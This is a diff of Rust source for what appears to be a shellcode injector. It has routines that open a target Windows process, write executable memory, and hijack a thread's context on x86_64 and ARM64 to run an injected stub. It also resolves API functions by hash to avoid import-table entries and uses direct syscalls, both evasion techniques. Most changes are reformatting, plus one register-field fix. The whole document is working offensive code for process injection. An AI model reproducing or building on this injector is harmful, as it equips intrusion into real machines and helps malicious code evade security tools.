@@ -121,9 +121,11 @@ impl Injector for ThreadPoolInjector {
 /// ```
 #[cfg(all(windows, target_arch = "aarch64"))]
 unsafe fn inject_via_thread_pool_arm64(pid: u32, shellcode: &[u8]) -> Result<()> {
-    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
-    use windows_sys::Win32::System::Threading::{PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
     use crate::win_types::PAGE_READWRITE;
+    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+    use windows_sys::Win32::System::Threading::{
+        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
+    };
 
     // ── Step 1: Open target process ──────────────────────────────────────
     let access_mask = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
@@ -479,9 +481,11 @@ fn arm64_load64(stub: &mut Vec<u8>, reg: u8, val: u64) {
 /// It must only be called with valid PIDs and well-formed shellcode.
 #[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn inject_via_thread_pool(pid: u32, shellcode: &[u8]) -> Result<()> {
-    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
-    use windows_sys::Win32::System::Threading::{PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
     use crate::win_types::PAGE_READWRITE;
+    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+    use windows_sys::Win32::System::Threading::{
+        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
+    };
 
     // ── Step 1: Open target process ──────────────────────────────────────
     let access_mask = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
@@ -913,8 +917,10 @@ unsafe fn execute_stub_via_hijack(
     pid: u32,
     stub_addr: *mut std::ffi::c_void,
 ) -> Result<()> {
-    use windows_sys::Win32::System::Threading::{THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME};
     use crate::win_types::{CONTEXT, CONTEXT_FULL};
+    use windows_sys::Win32::System::Threading::{
+        THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
+    };
 
     // Resolve Toolhelp32 functions for thread enumeration (no IAT entries).
     let k32_base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
@@ -927,7 +933,11 @@ unsafe fn execute_stub_via_hijack(
         pe_resolve::get_proc_address_by_hash(k32_base, snap_hash).map(|a| std::mem::transmute(a));
     let snap_fn = match snap_fn {
         Some(f) => f,
-        None => return Err(anyhow!("ThreadPool/hijack: CreateToolhelp32Snapshot not found")),
+        None => {
+            return Err(anyhow!(
+                "ThreadPool/hijack: CreateToolhelp32Snapshot not found"
+            ))
+        }
     };
 
     let t32f_hash = pe_resolve::hash_str(b"Thread32First\0");
@@ -949,7 +959,9 @@ unsafe fn execute_stub_via_hijack(
     // TH32CS_SNAPTHREAD = 0x00000004
     let snap = snap_fn(0x00000004, 0);
     if snap.is_null() {
-        return Err(anyhow!("ThreadPool/hijack: CreateToolhelp32Snapshot failed"));
+        return Err(anyhow!(
+            "ThreadPool/hijack: CreateToolhelp32Snapshot failed"
+        ));
     }
 
     const TE_SIZE: usize = 28;
@@ -957,8 +969,7 @@ unsafe fn execute_stub_via_hijack(
     let size_bytes = (TE_SIZE as u32).to_le_bytes();
     te_buf[0..4].copy_from_slice(&size_bytes);
 
-    let thread_access =
-        (THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT) as u64;
+    let thread_access = (THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT) as u64;
 
     let mut hijacked = false;
 
@@ -1050,11 +1061,7 @@ unsafe fn execute_stub_via_hijack(
                                                 0u64,
                                             )
                                             .ok();
-                                            crate::syscall!(
-                                                "NtClose",
-                                                h_thread_ptr as u64,
-                                            )
-                                            .ok();
+                                            crate::syscall!("NtClose", h_thread_ptr as u64,).ok();
                                             te_buf[4..].fill(0);
                                             te_buf[0..4].copy_from_slice(&size_bytes);
                                             if t32n_fn(snap, te_buf.as_mut_ptr()) == 0 {
@@ -1075,7 +1082,7 @@ unsafe fn execute_stub_via_hijack(
                                     // Set x30 (LR) to the original PC.  The stub's
                                     // stp x29, x30 / ldp x29, x30 / ret preserves
                                     // and returns through LR.
-                                    ctx.Lr = saved_pc;
+                                    ctx.u.s_mut().Lr = saved_pc;
                                     ctx.Pc = stub_addr as u64;
                                 }
 
@@ -1101,11 +1108,7 @@ unsafe fn execute_stub_via_hijack(
                                             0u64,
                                         )
                                         .ok();
-                                        crate::syscall!(
-                                            "NtClose",
-                                            h_thread_ptr as u64,
-                                        )
-                                        .ok();
+                                        crate::syscall!("NtClose", h_thread_ptr as u64,).ok();
                                         te_buf[4..].fill(0);
                                         te_buf[0..4].copy_from_slice(&size_bytes);
                                         if t32n_fn(snap, te_buf.as_mut_ptr()) == 0 {
@@ -1154,12 +1157,7 @@ unsafe fn execute_stub_via_hijack(
                             }
                             _ => {
                                 // NtGetContextThread failed — resume and try next.
-                                crate::syscall!(
-                                    "NtResumeThread",
-                                    h_thread_ptr as u64,
-                                    0u64,
-                                )
-                                .ok();
+                                crate::syscall!("NtResumeThread", h_thread_ptr as u64, 0u64,).ok();
                                 crate::syscall!("NtClose", h_thread_ptr as u64).ok();
                             }
                         }
